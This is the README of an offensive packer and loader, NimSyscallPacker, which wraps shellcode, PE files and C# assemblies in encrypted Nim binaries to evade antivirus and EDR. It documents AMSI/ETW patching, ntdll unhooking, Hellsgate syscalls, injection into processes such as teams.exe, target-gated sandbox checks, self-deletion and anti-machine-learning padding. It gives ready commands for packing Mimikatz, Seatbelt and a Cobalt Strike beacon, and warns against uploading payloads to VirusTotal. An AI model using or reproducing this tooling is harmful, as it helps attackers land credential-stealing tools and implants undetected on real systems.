# NimSyscallPacker / Loader

For some this might be self explanatory - but please don't upload the resulting payloads to VirusTotal or similar services. This will in the worst case lead to many signatures for the packed binaries and makes the tool useless. Use https://antiscan.me/ instead.

This Packer can be used to pack any C# Assembly, PE-File or Shellcode into a Nim binary. It will encrypt the target payload, build the corresponding Nim source code according to the given arguments and compiles it to an Nim binary.

In addition you'll need `nimble install nimcrypto docopt ptr_math strenc` plus `donut.exe` and `denim.exe` in the CWD depending on what you want to do.

Make sure you use an up to date Nim version. It works fine for me with Nim version 1.6.2.

Hellsgate currently doesn't compile correctly with the newest GCC versions. To make this work you have to use GCC v10.2.1 with MinGW-w64 v7.0.0 (https://github.com/brechtsanders/winlibs_mingw/releases/tag/10.2.1-snapshot20200912), and GCC v10.2.0 with MinGW-w64 v8.0.0 r5 (https://github.com/brechtsanders/winlibs_mingw/releases/tag/10.2.0-11.0.0-8.0.0-r5). See https://github.com/S3cur3Th1sSh1t-Sponsors/NimSyscallPacker/issues/2

If you're using NimSyscallPacker from Windows you should download the latest [donut](https://github.com/TheWover/donut) release and [denim](https://github.com/moloch--/denim) for full functionality. `donut.exe` has to be dropped into the current working directory. Denim should be installed via `denim setup`.

For Unix systems install donut via `pip3 install donut-shellcode`. `denim` cannot be used from Unix so obfuscation via LLVM is not possible here.

```
NimSyscall_Loader v 1.3

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --csharp    Encrypt a C# Assembly to load it on runtime
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --shellcode    Encrypt shellcode to load it on runtime
  --sleep 10    Sleep 10 secconds before decryption to evade in memory scanners
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
  --remotepatchETW    Patch ETW in the remote process before shellcode execution
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --domain targetdomain    Specify a domain for SandBox Evasion
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
```


To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:

```
NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
```

Some of you had problems loading Mimikatz with the packer via "--file=Mimikatz --pe" arguments to afterwards issue custom commands on runtime.

I found the reason for this behaviour. Don't ask me why but you cannot just take the release from Github but have to compile Mimikatz on your own (or build a custom version) and load this instead of the official release.

If you still want to embed the release version from github you can directly pass arguments like this:

```
Packedmimikatz.exe coffee exit
```

Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loading I modified my [Nim-RunPE](https://github.com/S3cur3Th1sSh1t/Nim-RunPe) to use Syscalls for PE-Loading and integrated it here:

To pack Mimikatz for example and load it via syscall PE-Loader use the following:

```
NimSyscallLoader --file=mimikatz.exe --peload
```

To pack Shellcode for local injection:

```
NimSyscallLoader --file=shellcode.bin --noAMSI
```

To load shellcode into a remote process:

```
NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
```

To load a C# assembly:
```
NimSyscallLoader --file=Seatbelt.exe --csharp
```

To load a C# assembly and use hellsgate for Syscall retrieval :
```
NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
```

To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:

```
NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
```

To add several thousand english words to bypass "Machine learning" detections:

```
NimSyscallLoader --file=Seatbelt.exe --csharp --pump=words
```


## TO-DO
- [x] PELoader via syscalls
- [x] Hellsgate support
- [X] Load only the needed Winim libraries
- [x] Remote process AMSI/ETW Patching based on [SnD_AMSI](https://github.com/whydee86/SnD_AMSI)
- [ ] Use Syscalls for remote patching
- [ ] Remotely load the "to patch" DLL (ntdll or amsi.dll) into the remote process before patching (otherwise it won't help us)
- [x] Hellsgate support for remote shellcode injection + PELoading
- [ ] DLL output + Sideloading capabilities?
- [ ] Maybe ParallelNimcalls support as alternative to GetSyscallStub & Hellsgate
- [ ] C# and/or Powershell output files
- [X] More syscalls and or D/Invoke for win32 functions
- [X] Cobalt Strike integration - CNA

## CREDITS

- [X] [@WhyDee86](https://twitter.com/WhyDee86) - Sleep function + remote process Library module
- [X] [@chvancooten](https://twitter.com/chvancooten) - Custom strenc + Inspiration from his Nim Packer
- [X] [@lefayjey](https://github.com/lefayjey) - S3cur3Th1sSh1t Discord Channel
